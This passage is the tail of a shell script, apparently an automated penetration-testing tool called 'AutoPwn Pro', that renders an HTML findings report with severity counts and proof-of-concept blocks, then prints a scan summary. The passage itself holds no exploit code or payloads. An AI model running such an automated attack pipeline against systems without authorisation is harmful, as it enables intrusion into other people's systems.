  display:grid;grid-template-columns:1fr auto;gap:30px;align-items:start
}}
.report-title{{font-size:2.4rem;font-weight:800;letter-spacing:-0.03em;
  background:linear-gradient(135deg,#e6edf3,#58a6ff);
  -webkit-background-clip:text;-webkit-text-fill-color:transparent}}
.report-meta{{font-size:0.85rem;color:var(--muted);margin-top:8px;font-family:'JetBrains Mono',monospace}}
.report-meta span{{color:var(--text)}}
.risk-score{{
  background:var(--surface2);border:1px solid var(--border);
  padding:20px 30px;text-align:center;min-width:160px;
}}
.risk-num{{font-size:3rem;font-weight:800;color:var(--crit);font-family:'JetBrains Mono',monospace;line-height:1}}
.risk-label{{font-size:0.7rem;letter-spacing:0.2em;color:var(--muted);margin-top:6px;text-transform:uppercase}}
/* SUMMARY */
.summary-grid{{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:40px}}
.summary-card{{background:var(--surface);border:1px solid var(--border);padding:24px}}
.card-title{{font-size:0.65rem;letter-spacing:0.25em;color:var(--muted);text-transform:uppercase;margin-bottom:16px;font-family:'JetBrains Mono',monospace}}
.summary-row{{display:flex;align-items:center;gap:12px;margin-bottom:10px}}
.sev-label{{font-family:'JetBrains Mono',monospace;font-size:0.75rem;font-weight:600;width:70px;flex-shrink:0}}
.sev-bar-wrap{{flex:1;height:6px;background:var(--border);overflow:hidden}}
.sev-bar{{height:100%;transition:width 1s ease;border-radius:0}}
.sev-count{{font-family:'JetBrains Mono',monospace;font-size:0.75rem;color:var(--muted);width:24px;text-align:right}}
.stat-grid{{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}}
.stat-item{{background:var(--bg);border:1px solid var(--border);padding:16px;text-align:center}}
.stat-num{{font-size:1.8rem;font-weight:800;font-family:'JetBrains Mono',monospace;color:var(--accent)}}
.stat-lbl{{font-size:0.65rem;color:var(--muted);letter-spacing:0.1em;text-transform:uppercase;margin-top:4px}}
/* FINDINGS */
.findings-title{{font-size:0.65rem;letter-spacing:0.25em;color:var(--muted);
  text-transform:uppercase;font-family:'JetBrains Mono',monospace;
  margin-bottom:16px;padding-bottom:10px;border-bottom:1px solid var(--border)}}
.finding{{border:1px solid var(--border);margin-bottom:8px;background:var(--surface)}}
.finding-header{{
  display:flex;justify-content:space-between;align-items:center;
  padding:14px 18px;cursor:pointer;transition:background 0.2s
}}
.finding-header:hover{{background:var(--surface2)}}
.finding-left{{display:flex;align-items:center;gap:10px}}
.finding-right{{display:flex;align-items:center;gap:10px}}
.sev-badge{{
  font-family:'JetBrains Mono',monospace;font-size:0.62rem;font-weight:600;
  padding:3px 10px;border:1px solid;letter-spacing:0.1em
}}
.cvss-badge{{
  font-family:'JetBrains Mono',monospace;font-size:0.62rem;
  color:var(--muted);background:var(--bg);border:1px solid var(--border);
  padding:3px 8px
}}
.finding-title{{font-size:0.9rem;font-weight:600}}
.tool-tag{{
  font-family:'JetBrains Mono',monospace;font-size:0.6rem;
  color:var(--accent);background:rgba(88,166,255,0.1);
  border:1px solid rgba(88,166,255,0.2);padding:2px 8px
}}
.chevron{{color:var(--muted);font-size:0.7rem;transition:transform 0.2s}}
.finding-body{{padding:20px 18px;border-top:1px solid var(--border);background:var(--bg)}}
.detail-grid{{display:grid;grid-template-columns:1fr 1fr;gap:20px}}
.detail-section{{margin-bottom:16px}}
.detail-label{{font-family:'JetBrains Mono',monospace;font-size:0.62rem;
  letter-spacing:0.15em;color:var(--muted);margin-bottom:6px;text-transform:uppercase}}
.detail-value{{font-size:0.85rem;color:var(--text);line-height:1.5}}
.url-val{{font-family:'JetBrains Mono',monospace;font-size:0.78rem;word-break:break-all}}
.evidence-val{{font-family:'JetBrains Mono',monospace;font-size:0.78rem;
  background:var(--surface);border:1px solid var(--border);
  padding:10px 12px;color:#7ee787;word-break:break-all}}
.remediation-val{{color:#79c0ff;font-size:0.82rem}}
.poc-block{{
  background:#0d1117;border:1px solid var(--border);border-left:3px solid var(--crit);
  padding:14px 16px;font-family:'JetBrains Mono',monospace;
  font-size:0.75rem;color:#7ee787;white-space:pre;overflow-x:auto;line-height:1.8
}}
/* FOOTER */
.report-footer{{margin-top:60px;padding-top:20px;border-top:1px solid var(--border);
  font-family:'JetBrains Mono',monospace;font-size:0.72rem;color:var(--muted);
  display:flex;justify-content:space-between}}
@media(max-width:768px){{
  .report-header,.summary-grid,.detail-grid{{grid-template-columns:1fr}}
  .stat-grid{{grid-template-columns:repeat(2,1fr)}}
}}
</style>
</head>
<body>
<div class="page">
  <div class="report-header">
    <div>
      <div class="report-title">Penetration Test Report</div>
      <div class="report-meta">
        Target: <span>{target}</span> &nbsp;|&nbsp;
        Date: <span>{date}</span> &nbsp;|&nbsp;
        Classification: <span>CONFIDENTIAL</span>
      </div>
    </div>
    <div class="risk-score">
      <div class="risk-num">{sev_counts.get('CRITICAL',0) + sev_counts.get('HIGH',0)}</div>
      <div class="risk-label">Critical/High Findings</div>
    </div>
  </div>

  <div class="summary-grid">
    <div class="summary-card">
      <div class="card-title">Findings by Severity</div>
      {summary_bars}
    </div>
    <div class="summary-card">
      <div class="card-title">Scan Statistics</div>
      <div class="stat-grid">
        <div class="stat-item">
          <div class="stat-num">{len(findings)}</div>
          <div class="stat-lbl">Total Findings</div>
        </div>
        <div class="stat-item">
          <div class="stat-num">{sev_counts.get('CRITICAL',0)}</div>
          <div class="stat-lbl">Critical</div>
        </div>
        <div class="stat-item">
          <div class="stat-num">{sev_counts.get('HIGH',0)}</div>
          <div class="stat-lbl">High</div>
        </div>
        <div class="stat-item">
          <div class="stat-num">{sev_counts.get('MEDIUM',0)}</div>
          <div class="stat-lbl">Medium</div>
        </div>
        <div class="stat-item">
          <div class="stat-num">{sev_counts.get('LOW',0)}</div>
          <div class="stat-lbl">Low</div>
        </div>
        <div class="stat-item">
          <div class="stat-num">AUTO</div>
          <div class="stat-lbl">Method</div>
        </div>
      </div>
    </div>
  </div>

  <div class="findings-title">CONFIRMED VULNERABILITY FINDINGS — SORTED BY SEVERITY</div>
  {findings_html if findings_html else '<div style="color:#8b949e;font-family:JetBrains Mono,monospace;font-size:0.85rem;padding:20px;text-align:center">No confirmed vulnerabilities found. Target appears well-hardened.</div>'}

  <div class="report-footer">
    <span>Generated by AutoPwn Pro | {date}</span>
    <span>Target: {target} | CONFIDENTIAL — FOR AUTHORIZED USE ONLY</span>
  </div>
</div>
<script>
function toggle(id) {{
  const body = document.querySelector('#'+id+' .finding-body');
  const chev = document.querySelector('#'+id+' .chevron');
  if(body.style.display==='none'){{
    body.style.display='block';
    chev.style.transform='rotate(180deg)';
  }} else {{
    body.style.display='none';
    chev.style.transform='';
  }}
}}
</script>
</body>
</html>"""

report_path = os.path.expandvars('$REPORT/pentest_report_$TARGET.html')
with open(report_path, 'w') as f:
    f.write(html)
print(f"Report saved: {report_path}")
PYEOF

# ── FINAL SUMMARY ────────────────────────────────────────────────────
echo ""
echo -e "${M}╔══════════════════════════════════════════════════════╗${NC}"
echo -e "${M}║           AUTOPWN PRO — SCAN COMPLETE                ║${NC}"
echo -e "${M}╠══════════════════════════════════════════════════════╣${NC}"
echo -e "${G}║ Target      : $TARGET${NC}"
echo -e "${G}║ Subdomains  : $(wc -l < "$RECON/all_subs.txt" 2>/dev/null || echo 0)${NC}"
echo -e "${G}║ Live Hosts  : $(wc -l < "$ENUM/live_urls.txt" 2>/dev/null || echo 0)${NC}"
echo -e "${Y}║ Total Vulns : $TOTAL_FINDINGS confirmed findings${NC}"
echo -e "${R}║ Critical    : $(python3 -c "import json; d=json.load(open('$FINDINGS_FILE')); print(sum(1 for f in d['findings'] if f.get('severity')=='CRITICAL'))" 2>/dev/null || echo 0)${NC}"
echo -e "${R}║ High        : $(python3 -c "import json; d=json.load(open('$FINDINGS_FILE')); print(sum(1 for f in d['findings'] if f.get('severity')=='HIGH'))" 2>/dev/null || echo 0)${NC}"
echo -e "${C}║ Report      : $REPORT/pentest_report_$TARGET.html${NC}"
echo -e "${M}╚══════════════════════════════════════════════════════╝${NC}"
echo ""
log "Open report: firefox $REPORT/pentest_report_$TARGET.html"
